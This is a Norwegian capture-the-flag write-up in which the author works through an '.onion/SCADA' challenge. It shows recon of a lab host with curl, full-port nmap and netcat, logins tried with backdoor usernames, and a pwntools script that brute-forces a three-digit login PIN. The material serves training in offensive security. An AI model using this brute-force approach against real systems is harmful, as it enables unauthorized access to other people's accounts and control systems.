# 2.3 Onion/SCADA

I denne delen av oppdraget skal vi forsøke å frigi gisslene ved å overstyre de automatiserte dørsystemene på skipet Kolbjørn.

## 2.3_onion

Fra [2.1_beslag_3](2_1_beslag.md) fikk vi et par linker i filen `important_links`. Vi sjekker den første:

```curl
$ curl http://fileserver/files/onion_name.txt
Due to OPSEC, the onion URL must be transitory.
The onion server is currently located at:
tpcoty656mdwnvqt7hiibmoeyb3dckoszs4cf5vmvtxdt52qkjykr5id.onion
```

Dette er da et [.onion domene](https://en.wikipedia.org/wiki/.onion) på [Tor nettverket](<https://en.wikipedia.org/wiki/Tor_(anonymity_network)>). Hvis vi åpner denne linken i Tor-browseren kommer vi til et bilde som minner om et kart. Det er tydelig at dette er en labyrint, og vi kan tenke oss at vi trolig skal manipulere dørene for å frigi gisler. Trolig via SCADA Client programmet som vi også fant link til i `Vault`.

Jeg fant to måter å finne det første flagget på - Den enkleste er å bare åpne console så står det der. Sammen med et ganske ok tips. MEN - dersom du skal finne cluet til videre fremgang må man se i koden:

Hvis man tar en titt i kilden til siden så finner man to JavaScript filer - `chunk-vendors.c7adce26.js` og `app.0459ce51.js`. Vi konsentrerer oss litt om den siste.

Selv om filene er noe obfuscated, så er de ikke fullstendig ugjenkjennelige. Og faktisk - om vi søker etter `FLAGG` i filen så finner vi til slutt følgende linjer innimellom:

```javascript
function () {
  console.log("PRO TIP: In case the TOR connection is unstable - you can access this via the hostname 'scada' internally"),
  console.log('Here is a flag: b4ba373.........................');
}
```

Det gir oss flagget og et hostname som gjør livet vårt litt enklere (og de neste oppgavene mulige).

Her er også noen andre linjer som kan være interessante for de påfølgende oppgavene:

```javascript
function () {
            var t = this,
              e = t.ws
                ? t.ws
                : new WebSocket('ws://'.concat(location.hostname, ':1339/')),
              s = 'POm8HLEmXJ1L2b1EhaXvdg==';
```

## 2.3_scada_aksess

Vi ser av siste koden over at port `1339` hos `scada` er åpen, men vi sjekker om det kan være flere også

```sh
$ nmap -sV -sC -oN scada.nmap -p- scada
Nmap scan report for scada (10.0.208.134)
Host is up (0.00046s latency).
rDNS record for 10.0.208.134: 41f9bba70284ba9d7358cae284c150ee_scada.1.pjni3exwu5yqbnp4sp9mqf7tx.41f9bba70284ba9d7358cae284c150ee_backend
Not shown: 65532 closed ports
PORT     STATE SERVICE        VERSION
80/tcp   open  http           nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: scada_frontend
1338/tcp open  wmc-log-svc?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:
|     Username: That username is not recognized
|     were unable to log you in..
|   NULL:
|_    Username:
1339/tcp open  kjtsiteserver?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Sec-Websocket-Version: 13
|     X-Content-Type-Options: nosniff
|     Date: Mon, 11 Jan 2021 17:05:51 GMT
|     Content-Length: 12
|     Request
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Sec-Websocket-Version: 13
|     X-Content-Type-Options: nosniff
|     Date: Mon, 11 Jan 2021 17:05:26 GMT
|     Content-Length: 12
|_    Request
```

Vi finner tre porter som er åpne; `80` og `1339` viste vi fra før - men `1338` er ny!

Om vi går til `:1338` i tor-browseren får vi ikke veldig mye spennende tilbake - annet en rå data. Men om vi prøver å koble til via `netcat` får vi opp en prompt som spør oss om et brukernavn;

```sh
$ nc scada 1338
Username: test
That username is not recognized
We were unable to log you in..
```

Fra chatten tidligere fant vi en beskrivelse på brukernavnene til backdooren i systemet. La oss prøve:

```sh
$ nc scada 1338
Username: Fra16Shorius
User access revoked..      <<===========
We were unable to log you in..
```

Frank sin bruker er tydeligvis deaktivert - men da er det jo flaks vi har flere navn etter oppgave [2.2_seatheworld_booking](2_2_seatheworld.md).

Ikke bare det, men vi kan bruke dette til å knytte kallenavn fra chat til navn. Eireen og Frank gjetter vi oss greit til så da står vi igjen med Joe og Dillon. Vi tester, og står igjen med følgende koblinger:

| Nick             | Navn           | Username     |
| ---------------- | -------------- | ------------ |
| eireen89         | EIREEN FARNABY | Eir8Farnaby  |
| RADAR            | JOE FARNABY    | Joe5Farnaby  |
| B4tCracK         | DILLON CRUISE  | Dil8Cruise   |
| hungry_hippo_123 | FRANK SHORIUS  | Fra16Shorius |

Vi forsøker logge inn som en av de andre

```
$ nc scada 1338
Username: Dil8Cruise
We have now sent a login PIN to you via SMS
Enter PIN: 1111
..the provided PIN was not correct.
```

Auda... men heldigvis har vi tilsynelatende uendelig med forsøk! Dette lukter bruteforce :)

```python
from pwn import *

HOSTNAME = 'scada'
PORT = '1338'

USERNAME = b'Eir8Farnaby'

PIN_NUM = 999
MAX_TRIES = 256

while True:

    # Connect to host
    r = remote(HOSTNAME, PORT)

    # See what data we get back
    log.info(r.recv())

    # Send the username (as bytes?)
    log.info(f"> SENDING USERNAME...")
    r.send(USERNAME)

    # See what data we get back
    log.info(r.recv())

    # Start bruteforcing pins
    TRIES = 1
    while TRIES < MAX_TRIES:
        log.info(f"> ({TRIES} SENDING PIN: {PIN_NUM}")
        r.send(str(PIN_NUM))
        log.info(r.recv())
        PIN_NUM -= 1
        TRIES += 1

    r.close()
```

Det viser seg at vi har 256 forsøk på å løse koden, det viser seg også at PIN koden er på 3 siffer! På dette tidspunktet var jeg ganske presset på tid. Dermed er skriptet over en veldig quick-and-dirty sak som egentlig bare spyr ut pinkoder fra 999 og nedover 256 ganger, og så restarter. Teorien er da at en eller annen gang kommer koden til å ligge innenfor den mengde tall som vi gjetter på og vi vil få flagget.

Kjørte skriptet, og til slutt ble flagget printet!

_Desverre var det så langt jeg kom i 2021. Jeg gikk tom for tid, men neste steg hadde da vært å forsøke frigi gisslene_
